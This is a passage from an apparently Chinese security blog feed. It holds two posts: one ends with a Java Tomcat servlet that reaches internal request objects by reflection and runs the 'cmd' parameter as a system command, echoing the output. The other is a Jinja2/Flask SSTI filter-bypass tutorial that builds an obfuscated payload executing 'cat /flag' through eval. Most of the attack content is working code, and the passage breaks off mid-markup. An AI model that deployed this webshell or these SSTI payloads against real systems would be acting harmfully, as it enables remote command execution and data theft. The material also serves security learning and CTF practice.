class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardService;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.ProtocolHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebServlet(&quot;/response&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tomcat_Echo_Response</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//获取StandardService</span></span><br><span class="line">        org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"> </span><br><span class="line">        System.out.println(standardContext);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取ApplicationContext</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(standardContext);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取StandardService</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">standardServiceField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            standardServiceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (StandardService) standardServiceField.get(applicationContext);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取Connector</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectorsField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">            connectorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Connector[] connectors = (Connector[]) connectorsField.get(standardService);</span><br><span class="line">            <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> connectors[<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取Handler</span></span><br><span class="line">            <span class="type">ProtocolHandler</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> connector.getProtocolHandler();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">handlerField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">            handlerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.tomcat.util.net.AbstractEndpoint.<span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取内部类AbstractProtocol$ConnectionHandler的global属性</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">globalHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">            globalHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">RequestGroupInfo</span> <span class="variable">global</span> <span class="operator">=</span> (RequestGroupInfo) globalHandler.get(handler);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取processors</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">processorsField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            processorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取request和response</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">for</span> (RequestInfo requestInfo : requestInfoList)&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//获取org.apache.coyote.Request</span></span><br><span class="line">                org.apache.coyote.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request</span></span><br><span class="line">                org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">http_request</span> <span class="operator">=</span> (org.apache.catalina.connector.Request) request.getNote(<span class="number">1</span>);</span><br><span class="line">                org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">http_response</span> <span class="operator">=</span> http_request.getResponse();</span><br><span class="line"> </span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> http_response.getWriter();</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> http_request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                scanner.close();</span><br><span class="line">                writer.write(result);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010922036.png"                      alt="image-20230201092245861"                ><figcaption>image-20230201092245861</figcaption></figure></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a class="link"   href="https://su18.org/post/memory-shell/" >JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/7388#toc-2" >基于tomcat的内存 Webshell 无文件攻击技术 - 先知社区 (aliyun.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://goodapple.top/archives/1355" >Java安全学习——内存马 - 枫のBlog (goodapple.top) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://www.kingkk.com/2020/03/Tomcat%E4%B8%AD%E4%B8%80%E7%A7%8D%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95/" >Tomcat中一种半通用回显方法 - Kingkk’s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jinjia2 过滤器</title>
      <link href="/2023/01/16/jinjia2-%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
      <url>/2023/01/16/jinjia2-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="jinjia2-过滤器"><a href="#jinjia2-过滤器" class="headerlink" title="jinjia2  过滤器"></a>jinjia2  过滤器</h1><p><a class="link"   href="https://forum.butian.net/share/1371" >奇安信攻防社区-flask SSTI学习与总结 (butian.net) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="flask-过滤器"><a href="#flask-过滤器" class="headerlink" title="flask 过滤器"></a>flask 过滤器</h2><p>flask过滤器和其它语言的过滤器作用几乎一致，对数据进行过滤</p><p>使用</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">变量|过滤器</span><br><span class="line">variable|<span class="built_in">filter</span>(args)    </span><br><span class="line">variable|<span class="built_in">filter</span>        //如果过滤器没有参数可以不加括号</span><br></pre></td></tr></table></figure></div><h3 id="常用过滤器"><a href="#常用过滤器" class="headerlink" title="常用过滤器"></a>常用过滤器</h3><p>**<code>int()</code>**：将值转换为int类型；</p><p>**<code>float()</code>**：将值转换为float类型；</p><p>**<code>lower()</code>**：将字符串转换为小写；</p><p>**<code>upper()</code>**：将字符串转换为大写；</p><p><code>min()</code>:求序列中最小值</p><p>**<code>title()</code>**：把值中的每个单词的首字母都转成大写；</p><p>**<code>capitalize()</code>**：把变量值的首字母转成大写，其余字母转小写；</p><p>**<code>trim()</code>**：截取字符串前面和后面的空白字符；</p><p>**<code>wordcount()</code>**：计算一个长字符串中单词的个数；</p><p>**<code>reverse()</code>**：字符串反转；</p><p>**<code>replace(value,old,new)</code>**： 替换将old替换为new的字符串；</p><p>**<code>truncate(value,length=255,killwords=False)</code>**：截取length长度的字符串；</p><p>**<code>striptags()</code>**：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</p><p>**<code>escape()</code>或<code>e</code>**：转义字符，会将<code>&lt;</code>、<code>&gt;</code>等符号转义成<code>HTML</code>中的符号。显例：<code>content|escape</code>或<code>content|e</code>。</p><p>**<code>safe()</code>**： 禁用<code>HTML</code>转义，如果开启了全局转义，那么<code>safe</code>过滤器会将变量关掉转义。示例：<code> &#123;&#123;'<em>hello</em>'|safe&#125;&#125;</code>；</p><p>**<code>list()</code>**：将变量列成列表；</p><p>**<code>string()</code>**：将变量转换成字符串；</p><p>**<code>join()</code>**：将一个序列中的参数值拼接成字符串。示例看上面<code>payload</code>；</p><p>**<code>abs()</code>**：返回一个数值的绝对值；</p><p>**<code>first()</code>**：返回一个序列的第一个元素；</p><p>**<code>last()</code>**：返回一个序列的最后一个元素；</p><p>**<code>format(value,arags,\*kwargs)</code>**：格式化字符串。比如：<code>&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!</code></p><p>**<code>length()</code>**：返回一个序列或者字典的长度；</p><p>**<code>sum()</code>**：返回列表内数值的和；</p><p>**<code>sort()</code>**：返回排序后的列表；</p><p>**<code>default(value,default_value,boolean=false)</code>**：如果当前变量没有值，则会使用参数中的值来代替。示例：<code>name|default(&#39;xiaotuo&#39;)</code>—-如果name不存在，则会使用<code>xiaotuo</code>来替代。<code>boolean=False</code>默认是在只有这个变量为<code>undefined</code>的时候才会使用<code>default</code>中的值，如果想使用<code>python</code>的形式判断是否为<code>false</code>，则可以传递<code>boolean=true</code>。也可以使用<code>or</code>来替换。</p><h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><h3 id="获取入口点"><a href="#获取入口点" class="headerlink" title="获取入口点"></a>获取入口点</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> org = (<span class="variable language_">self</span>|string()) %&#125;&#123;&#123;org&#125;&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> org = <span class="variable language_">self</span>|string|urlencode %&#125;&#123;&#123;org&#125;&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>这些基本都能得到一长串字符串，里面包含字母、尖号、下划线、数字等，可以通过增加下标来获取</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125; </span><br><span class="line"><span class="comment"># &lt;generator object select_or_reject at 0x1047f7ac0&gt;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org[<span class="number">1</span>]&#125;&#125;</span><br><span class="line"><span class="comment"># g</span></span><br></pre></td></tr></table></figure></div></blockquote><p>这个对应道字符串含有百分号，这样可以通过url编码得到所有字符</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = <span class="variable language_">self</span>|string|urlencode %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line"><span class="comment"># %3CTemplateReference%20None%3E</span></span><br></pre></td></tr></table></figure></div><p>这个包含了更多的字符种类</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line"><span class="comment"># The default undefined type. This undefined type can be printed and iterated over, but every other access will raise an :exc:`UndefinedError`: &gt;&gt;&gt; foo = Undefined(name=&#x27;foo&#x27;) &gt;&gt;&gt; str(foo) &#x27;&#x27; &gt;&gt;&gt; not foo True &gt;&gt;&gt; foo + 42 Traceback (most recent call last): ... jinja2.exceptions.UndefinedError: &#x27;foo&#x27; is undefined </span></span><br></pre></td></tr></table></figure></div><p>对于获取数字，除了上面出现的那几种外我们还可以有以下几种方法：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> num = (<span class="variable language_">self</span>|<span class="built_in">int</span>) %&#125;&#123;&#123;num&#125;&#125;    <span class="comment"># 0, 通过int过滤器获取数字</span></span><br><span class="line">&#123;% <span class="built_in">set</span> num = (<span class="variable language_">self</span>|string|length) %&#125;&#123;&#123;num&#125;&#125;    <span class="comment"># 24, 通过length过滤器获取数字</span></span><br></pre></td></tr></table></figure></div><h3 id="获取特定字符"><a href="#获取特定字符" class="headerlink" title="获取特定字符"></a>获取特定字符</h3><p>获取.</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> point = <span class="variable language_">self</span>|<span class="built_in">float</span>|string|<span class="built_in">min</span> %&#125;    <span class="comment"># 通过float过滤器获取点 .</span></span><br></pre></td></tr></table></figure></div><p>下划线</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;&#123;&#123;xhx&#125;&#125;  </span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=&#123; &#125;|select|string %&#125;&#123;&#123;xhx[<span class="number">24</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>空格</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> space = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">10</span>)|string) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space = &#123; &#125;|select|string %&#125;&#123;&#123;space[<span class="number">10</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>左括号(                </p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">195</span>)|string) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yin = app.__doc__|string %&#125;&#123;&#123;yin[<span class="number">195</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>右括号)</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">199</span>)|string) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yin = app.__doc__|string %&#125;&#123;&#123;yin[<span class="number">199</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>单引号’</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">181</span>)|string) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yin = app.__doc__|string %&#125;&#123;&#123;yin[<span class="number">181</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></div><h3 id="c的利用"><a href="#c的利用" class="headerlink" title="%c的利用"></a>%c的利用</h3><p>常见数字</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;    <span class="comment"># 0</span></span><br><span class="line">&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;    <span class="comment"># 1</span></span><br><span class="line">&#123;% <span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 2</span></span><br><span class="line">&#123;% <span class="built_in">set</span> four = (two*two)|<span class="built_in">int</span> %&#125;    <span class="comment"># 4</span></span><br><span class="line">&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;    <span class="comment"># 5</span></span><br><span class="line">&#123;% <span class="built_in">set</span> seven = (zero-one-one-five)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 7</span></span><br></pre></td></tr></table></figure></div><p>字符c</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> c = <span class="built_in">dict</span>(c=aa)|reverse|first %&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p><strong>dict()</strong> 函数用于创建一个字典,这里dict(c&#x3D;aa)是 {‘c’: Undefined}</p></blockquote><p>百分号</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> bfh = <span class="variable language_">self</span>|string|urlencode|first %&#125; </span><br></pre></td></tr></table></figure></div><p>%c </p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> bfhc=bfh~c %&#125; </span><br></pre></td></tr></table></figure></div><blockquote><p>这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</p></blockquote><p>使用%c构造斜杠 &#x2F;</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> slas = bfhc%((four~seven)|<span class="built_in">int</span>) %&#125; </span><br></pre></td></tr></table></figure></div><h3 id="常见字段"><a href="#常见字段" class="headerlink" title="常见字段"></a>常见字段</h3><p>builtins</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> but = <span class="built_in">dict</span>(buil=aa,tins=dd)|join %&#125;  </span><br></pre></td></tr></table></figure></div><p>import</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> imp = <span class="built_in">dict</span>(imp=aa,ort=dd)|join %&#125; </span><br></pre></td></tr></table></figure></div><p>popen</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pon = <span class="built_in">dict</span>(po=aa,pen=dd)|join %&#125; </span><br></pre></td></tr></table></figure></div><p>os</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> os = <span class="built_in">dict</span>(o=aa,s=dd)|join %&#125; </span><br></pre></td></tr></table></figure></div><p>cat</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> ca = <span class="built_in">dict</span>(ca=aa,t=dd)|join %&#125;</span><br></pre></td></tr></table></figure></div><p>flag</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join %&#125;</span><br></pre></td></tr></table></figure></div><p>eval</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join %&#125; </span><br></pre></td></tr></table></figure></div><p>read</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join %&#125;  </span><br></pre></td></tr></table></figure></div><p><code>__builtins__</code></p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> bul = xhx*<span class="number">2</span>~but~xhx*<span class="number">2</span> %&#125;</span><br></pre></td></tr></table></figure></div><p>将上面构造的字符或字符串拼接起来构造出 <code>__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pld = xhx*<span class="number">2</span>~imp~xhx*<span class="number">2</span>~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br></pre></td></tr></table></figure></div><p>pld放入SSTI万能payload</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> whoami.__init__.__globals__.items() %&#125;    <span class="comment"># globals</span></span><br><span class="line">    &#123;% <span class="keyword">if</span> f == bul %&#125; </span><br><span class="line">        &#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> v.items() %&#125;    <span class="comment"># builtins</span></span><br><span class="line">            &#123;% <span class="keyword">if</span> a == ev %&#125;    <span class="comment"># eval</span></span><br><span class="line">                &#123;&#123;b(pld)&#125;&#125;    <span class="comment"># eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span></span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div><p>过滤.的版本</p><div 